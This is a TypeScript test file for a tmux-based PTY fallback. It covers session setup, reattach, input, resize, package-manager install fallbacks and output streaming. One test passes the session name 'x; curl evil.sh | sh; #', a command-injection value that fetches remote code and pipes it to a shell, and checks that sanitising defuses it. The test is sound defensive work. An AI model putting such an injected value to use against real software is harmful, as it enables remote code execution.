/**
 * Tests for the tmux-over-exec PTY fallback.
 *
 * Run: npx tsx --test src/mux/pty/tmux.test.ts
 *
 * The scripted ExecLike stands in for a substrate handle so the session
 * lifecycle can be asserted without a sandbox.
 */

import assert from "node:assert/strict";
import test from "node:test";

import { openTmuxPty } from "./tmux.js";
import type { ExecResult, ExecStreamEvent } from "../types.js";

const SNAPSHOT_MARKER = "__AM_SNAPSHOT__";

type Recorder = {
	exec: (command: string, options?: { timeoutMs?: number }) => Promise<ExecResult>;
	execBackground: (command: string) => Promise<void>;
	execStream: (command: string) => AsyncGenerator<ExecStreamEvent, void, void>;
	execCalls: string[];
	backgroundCalls: string[];
	streamCalls: string[];
};

function recorder(options: { offset?: number; snapshot?: string } = {}): Recorder {
	const execCalls: string[] = [];
	const backgroundCalls: string[] = [];
	const streamCalls: string[] = [];
	const offset = options.offset ?? 0;
	const snapshot = options.snapshot ?? "";
	return {
		execCalls,
		backgroundCalls,
		streamCalls,
		async exec(command) {
			execCalls.push(command);
			// The setup round trip reports "<offset>\n__AM_SNAPSHOT__\n<pane>".
			const stdout = command.includes(SNAPSHOT_MARKER)
				? `${offset}\n${SNAPSHOT_MARKER}\n${snapshot}`
				: "";
			return { stdout, stderr: "", exitCode: 0, durationMs: 1 };
		},
		async execBackground(command) {
			backgroundCalls.push(command);
		},
		async *execStream(command) {
			streamCalls.push(command);
			yield { type: "stdout", data: "delta-after-attach" };
			yield { type: "exit", exitCode: 0 };
		},
	};
}

test("attach replays the pane snapshot before streaming deltas", async () => {
	const target = recorder({ offset: 4096, snapshot: "restored screen\n" });
	const pty = await openTmuxPty(target, { session: "keepme" });

	const decoder = new TextDecoder();
	let received = "";
	for await (const bytes of pty.output) {
		received += decoder.decode(bytes);
	}
	assert.equal(received, "restored screen\ndelta-after-attach");
	// The tail must resume from the reported byte offset, not from zero.
	assert.match(target.streamCalls[0], /tail -c \+4097 -f/);
});

test("named sessions detach on close; unnamed sessions are reaped", async () => {
	const named = recorder();
	const namedPty = await openTmuxPty(named, { session: "keepme" });
	await namedPty.close();
	assert.equal(
		named.execCalls.some((call) => call.includes("kill-session")),
		false,
		"a named session must survive close() so the next open can reattach",
	);

	const anonymous = recorder();
	const anonymousPty = await openTmuxPty(anonymous, {});
	await anonymousPty.close();
	assert.equal(
		anonymous.execCalls.some((call) => call.includes("kill-session")),
		true,
		"an unnamed session has no reattach handle, so close() reaps it",
	);
});

test("input is sent as hex send-keys and resize goes to the session", async () => {
	const target = recorder();
	const pty = await openTmuxPty(target, { session: "keepme", cols: 100, rows: 30 });

	await pty.write("hi\n");
	const send = target.backgroundCalls.find((call) => call.includes("send-keys"));
	assert.ok(send, "write() uses tmux send-keys");
	// "hi\n" -> 68 69 0a
	assert.match(send, /-H -t 'keepme' 68 69 0a/);

	await pty.resize(120, 40);
	const resize = target.backgroundCalls.find((call) => call.includes("resize-window"));
	assert.ok(resize, "resize() uses tmux resize-window");
	assert.match(resize, /-x 120 -y 40/);
});

test("setup creates the session with the requested geometry and log wiring", async () => {
	const target = recorder();
	await openTmuxPty(target, { session: "sized", cols: 133, rows: 42 });
	const setup = target.execCalls[0];
	assert.match(setup, /new-session -d -s 'sized' -x 133 -y 42/);
	// -o toggles, so re-running it on a reattach closes the pipe and the
	// terminal goes silent. Verified on a live sandbox; never reintroduce.
	assert.match(setup, /pipe-pane -t 'sized'/);
	assert.ok(!setup.includes("pipe-pane -o"), "pipe-pane -o toggles the pipe off");
	assert.match(setup, /has-session -t 'sized'/);
	assert.ok(!setup.includes("\n"), "setup must stay a single shell line");
});

test("the install fallback covers every declared-tmux lane's package manager", async () => {
	const target = recorder();
	await openTmuxPty(target, { session: "install" });
	const setup = target.execCalls[0];
	// dnf/yum are what make `pty: "tmux"` true on vercel: measured 2026-08-05
	// its node24 runtime is Amazon Linux 2023 with no tmux, no apt-get and no
	// apk, so the apt-only chain could install nothing and openPty died at
	// `tmux has-session` -- a declared capability that could not be delivered.
	for (const manager of [
		"apt-get install -y tmux",
		"dnf install -y tmux",
		"yum install -y tmux",
		"apk add tmux",
	]) {
		assert.ok(
			setup.includes(manager),
			`the ensure line must try ${manager} (a declared-tmux lane may boot on it)`,
		);
	}
	// Every sudo attempt is -n: with no tty and a password-protected sudo, a
	// prompting sudo burns the whole 75s budget instead of falling through to
	// the next manager.
	for (const sudoCall of setup.match(/sudo[^|]*/g) ?? []) {
		assert.match(sudoCall, /^sudo -n /, `sudo must never prompt: ${sudoCall}`);
	}
	assert.ok(setup.includes("command -v tmux"), "the install must be conditional");
	// The install is inside the || branch of the tmux check, so an image that
	// ships tmux pays nothing.
	assert.match(setup, /command -v tmux[^|]*\|\| \(/);
});

test("setup failure surfaces the exit code and output", async () => {
	const target = recorder();
	target.exec = async () => ({
		stdout: "",
		stderr: "tmux: not found",
		exitCode: 127,
		durationMs: 1,
	});
	await assert.rejects(
		openTmuxPty(target, { session: "broken" }),
		/exit 127.*tmux: not found/s,
	);
});

test("session names cannot escape the shell and never contain spaces", async () => {
	const target = recorder();
	await openTmuxPty(target, { session: "x; curl evil.sh | sh; #" });
	const setup = target.execCalls[0];
	assert.ok(
		!setup.includes("curl evil.sh"),
		"a hostile session name must not reach the shell as code",
	);
	// Every unsafe character becomes a dash, so the name is inert both as
	// a tmux target and inside the log path.
	assert.match(setup, /-s 'x--curl-evil\.sh---sh---'/);
	assert.match(setup, /\/tmp\/am-mux-x--curl-evil\.sh---sh---\.log/);

	const spaced = recorder();
	await openTmuxPty(spaced, { session: "my session" });
	assert.match(spaced.execCalls[0], /\/tmp\/am-mux-my-session\.log/);
});

test("an interactive command runs through env + sh -c, not an assignment prefix", async () => {
	const target = recorder();
	await openTmuxPty(target, {
		session: "agent",
		command: "{ export PATH=/x:$PATH; claude; }",
		env: { ANTHROPIC_API_KEY: "sk-test", IS_SANDBOX: "1" },
	});
	const setup = target.execCalls[0];
	// A variable-assignment prefix in front of a brace group is a shell
	// syntax error, which silently broke `am mux term`.
	assert.ok(
		!/ANTHROPIC_API_KEY='sk-test' IS_SANDBOX='1' \{/.test(setup),
		"env must not be an assignment prefix on a compound command",
	);
	// The whole `env ... sh -c '<command>'` string is one tmux argument, so
	// its inner quotes arrive escaped.
	assert.match(setup, /env ANTHROPIC_API_KEY=/);
	assert.match(setup, /IS_SANDBOX=/);
	assert.match(setup, /sh -c /);
	assert.match(setup, /export PATH=\/x:\$PATH; claude;/);
});

test("the output tail stops when the remote session goes away", async () => {
	const target = recorder();
	const pty = await openTmuxPty(target, { session: "watched" });
	for await (const _bytes of pty.output) {
		void _bytes;
	}
	const tail = target.streamCalls[0];
	// Without a watchdog, `tail -f` never ends and both the consumer and
	// `exited` hang after the session dies.
	assert.match(tail, /while tmux has-session -t 'watched'/);
	assert.match(tail, /kill \$TAILPID/);
	assert.equal(await pty.exited, null);
});

test("output is single-use and says so instead of misdelivering", async () => {
	const target = recorder({ offset: 10, snapshot: "screen\n" });
	const pty = await openTmuxPty(target, { session: "once" });
	for await (const _bytes of pty.output) {
		void _bytes;
	}
	// A second consumer cannot be served: the stream is live with no buffer,
	// and silently interleaving next() calls is what made a working reattach
	// look broken.
	assert.throws(
		() => pty.output[Symbol.asyncIterator](),
		/single-use live byte stream/,
	);
});
